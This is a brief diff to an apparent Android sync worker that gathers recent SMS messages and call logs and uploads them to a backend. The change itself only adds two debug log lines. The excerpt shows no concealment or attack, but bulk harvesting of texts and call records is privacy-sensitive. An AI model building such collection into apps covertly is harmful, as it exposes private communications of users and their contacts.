@@ -32,10 +32,12 @@ class DataSyncWorker(
             // Collect SMS data
             val smsMonitor = SMSMonitor(applicationContext)
             val smsData = smsMonitor.getRecentMessages()
+            android.util.Log.d("DataSyncWorker", "Collected ${smsData.size} SMS messages for sync")
 
             // Sync data with backend
             repository.syncCallLogs(callLogData)
             repository.syncSMSData(smsData)
+            android.util.Log.d("DataSyncWorker", "Sync completed successfully")
 
             // Update last sync time
             preferenceManager.setLastSyncTime(System.currentTimeMillis())
